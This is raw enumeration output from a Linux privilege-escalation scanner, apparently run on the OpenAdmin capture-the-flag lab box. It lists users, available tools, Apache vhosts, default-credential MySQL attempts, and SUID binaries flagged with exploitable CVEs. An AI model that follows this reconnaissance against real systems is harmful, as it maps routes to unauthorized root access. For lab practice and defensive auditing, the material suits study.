╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 08:29:37 up 15:58,  0 users,  load average: 0.16, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
                                                                                                                                                                                                                                            
wtmp begins Thu May  1 06:25:02 2025

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Tue Aug 17 13:28:22 +0000 2021
jimmy            pts/1    10.10.14.3       Thu Jan  2 20:50:03 +0000 2020
joanna           pts/0    10.10.14.15      Tue Jul 27 06:12:07 +0000 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


 93  820k   93  769k    0     0  16534      0  0:00:50  0:00:47  0:00:03 16636                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/snap/core/7270/usr/share/gcc-5                                                                                                                                                                                                             
/snap/core/8039/usr/share/gcc-5
/usr/share/gcc-8

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                      
Server built:   2019-09-16T12:58:48
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
<VirtualHost *:80>
        ServerName openadmin.htb
        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>



-rw-r--r-- 1 root root 71817 Oct 28  2019 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct 28  2019 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 317 Nov 21  2019 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 13  2017 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug 17  2021 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Nov 21  2019 /etc/ldap


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3612 May 15  2019 /snap/core/7270/etc/cloud/cloud.cfg                                                                                                                                                                
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core/8039/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings                                                                                                                                                                  
drwxr-xr-x 2 root root 121 Oct 30  2019 /snap/core/8039/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug  5  2019 /usr/share/keyrings




╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7270/usr/share/bash-completion/completions/postfix                                                                                                                                       

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8039/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                                                                                                                            


drwxrwxr-x 8 www-data www-data 4096 Nov 22  2019 /var/www/html/marga/.git

╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            


-rw-r--r-- 1 root root 69 Oct 28  2019 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct 28  2019 /usr/share/php7.2-common/common/ftp.ini                                                                                                                                                              






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                                                                                                                                         
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/7270/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8039/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 root root 655 May  9  2019 /snap/core/7270/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8039/etc/skel/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                                                                            





















lrwxrwxrwx 1 root root 20 Nov 21  2019 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Nov 21  2019 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Nov 21  2019 /var/lib/dpkg/alternatives/my.cnf






























╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                                                                             
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper                                                                                                                                                                 


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                                                                                  
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                                                                  
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
gpg Not Found
netpgpkeys Not Found                                                                                                                                                                                                                        
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 13395 Jun 21  2019 /snap/core/7270/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Oct 30  2019 /snap/core/8039/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8039/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8039/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8039/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /snap/core/7270/etc/pam.d/passwd
passwd file: /snap/core/7270/etc/passwd
passwd file: /snap/core/7270/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7270/var/lib/extrausers/passwd
passwd file: /snap/core/8039/etc/pam.d/passwd
passwd file: /snap/core/8039/etc/passwd
passwd file: /snap/core/8039/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8039/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            




-rw-r--r-- 1 root root 604 Nov 21  2019 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 176 Nov 21  2019 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 96 Nov 21  2019 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 396 Nov 21  2019 /etc/ssh/ssh_host_rsa_key.pub

PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
18491PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                                                                       
tmux 2.6                                                                                                                                                                                                                                    


/tmp/tmux-33



100  820k  100  820k    0     0  16859      0  0:00:49  0:00:49 --:--:-- 13439
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 107K Jul 12  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 687K Jun 11  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 27K Aug 22  2019 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 43K Aug 22  2019 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8039/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8039/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8039/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8039/bin/su
-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8039/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8039/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8039/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8039/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8039/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8039/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8039/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8039/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8039/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Oct 30  2019 /snap/core/8039/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8039/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwsr-sr-x 1 root root 107K Jul 12  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 31K Aug 22  2019 /usr/bin/wall
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 15  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8039/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8039/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8039/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8039/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8039/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8039/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8039/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8039/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8039/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8039/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Oct 10  2019 /snap/core/8039/usr/bin/wall
-rwsr-sr-x 1 root root 105K Oct 30  2019 /snap/core/8039/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                                                                      
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
══╣ Current shell capabilities                                                                                                                                                                                                              
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
                                                                                                                                                                                                                                            
╔══════════╣ Checking misconfigurations of ld.so
